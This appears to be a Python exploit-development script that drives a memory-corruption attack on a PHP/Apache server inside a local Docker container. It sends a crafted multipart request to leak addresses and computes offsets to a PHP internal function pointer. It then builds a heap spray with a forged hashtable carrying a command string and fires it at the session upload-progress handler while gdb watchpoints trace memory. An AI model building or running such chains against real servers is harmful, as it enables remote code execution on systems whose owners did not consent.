#!/usr/bin/env python3
"""A2(fillers=116) -> hardware watchpoint on hsv during a harmless B2 spray."""
import json, os, subprocess, sys, time
D="/tmp/opencode/research/modphp_84_matrix_20261023T074116Z"
sys.path.insert(0, os.path.join(D,"scripts"))
sys.path.insert(0, "/tmp/opencode/research/9bie_update_20261022T115026Z/code/repo/pure")
import chain84 as C
from fake_ref_b import make_spray, make_name
from mk_ht import build as build_ht
CNAME="m109-d8424pkg"; PORT=18740; LOG="/var/log/apache2/p2s-access.log"; BOUND=b"C"*10
def sh(cmd): return subprocess.run(cmd, capture_output=True, text=True)
def lines(): return sh(["docker","exec",CNAME,"sh","-c","cat %s 2>/dev/null"%LOG]).stdout.splitlines()
def state(pid):
    r=sh(["docker","exec",CNAME,"gdb","-batch","-q","-p",str(pid),"-x","/tmp/deb_state.gdb"])
    for l in r.stdout.splitlines():
        if l.startswith("DEBSTATE"):
            return dict(kv.split("=",1) for kv in l.split()[1:])
    return {}
def b2(S, zif, cmd, rc=2, n1=500, n2=495, vl=384):
    spray=make_spray(vl,S,rc,0x0107,8,32); ht=build_ht(S,zif,cmd.encode(),384)
    def part(n,v): return b"--"+BOUND+b"\r\nContent-Disposition: form-data; name=\""+n+b"\"\r\n\r\n"+v+b"\r\n"
    body=bytearray()
    for i in range(n1): body+=part(make_name(b"s",i,10),spray)
    body+=part(b"ht",ht); body+=part(b"PHPSESSID",b"a"*32); body+=part(b"PHP_SESSION_UPLOAD_PROGRESS",b"k0")
    for i in range(n2): body+=part(make_name(b"t",i,10),spray)
    body+=b"--"+BOUND+b"--\r\n"
    return bytes(body)
print("restart",flush=True); sh(["docker","restart",CNAME]); time.sleep(1.8)
sh(["docker","cp",os.path.join(D,"scripts/deb_mm.gdb"),CNAME+":/tmp/deb_mm.gdb"])
n=len(lines())
body=C.a2_body(fillers=116)
r=C.send_plain(PORT,"/index.php",body)
time.sleep(0.4); lg=lines()[n:]
pid=int(lg[-1].split()[0]) if lg else None
st=state(pid) if pid else {}
print("A2",r.split(b"\r\n",1)[0],"pid",pid,st,flush=True)
hsv=int(st["hsv"],16); main=int(st["main"],16); lib=int(st["lib"],16)
S=main+0xF8398; zif=lib+0x24CDD0
print("hsv off",hex(hsv-main),flush=True)
script="""set pagination off
set confirm off
set can-use-hw-watchpoints 1
watch *(unsigned long long*)0x%x
commands
silent
printf "WA0 val=0x%%lx\\n", *(unsigned long long*)0x%x
bt 5
continue
end
watch *(unsigned long long*)0x%x
commands
silent
printf "W8 val=0x%%lx\\n", *(unsigned long long*)0x%x
bt 5
continue
end
continue
detach
quit
""" % (hsv,hsv,hsv+8,hsv+8)
open(os.path.join(D,"out/watch116.gdb"),"w").write(script)
sh(["docker","cp",os.path.join(D,"out/watch116.gdb"),CNAME+":/tmp/watch116.gdb"])
gp=subprocess.Popen(["docker","exec",CNAME,"gdb","-batch","-q","-p",str(pid),"-x","/tmp/watch116.gdb"],
                    stdout=open(os.path.join(D,"out/watch116.txt"),"wb"),stderr=subprocess.STDOUT)
time.sleep(1.6)
print("gdb poll",gp.poll(),flush=True)
bb=b2(S,zif,"DBW116_%x"%(int(time.time())&0xFFFFF),rc=2)
sent=[]
for k in range(6):
    n=len(lines())
    resp=C.send_plain(PORT,"/index.php",bb,timeout=300)
    time.sleep(0.3); lg=lines()[n:]
    p=int(lg[-1].split()[0]) if lg else None
    sent.append({"k":k,"pid":p,"status":resp.split(b"\r\n",1)[0].decode("latin1")})
    print("B2",k,"pid",p,resp.split(b"\r\n",1)[0],flush=True)
    if p==pid: break
for i in range(60):
    if gp.poll() is not None: break
    time.sleep(0.25)
if gp.poll() is None: gp.kill(); gp.wait()
out=open(os.path.join(D,"out/watch116.txt"),encoding="latin1").read()
print("=== WATCH ===",flush=True)
print(out[-5000:],flush=True)
json.dump({"pid":pid,"state":st,"sent":sent,"out":out[-8000:]},open(os.path.join(D,"out/watch116.json"),"w"),indent=1)
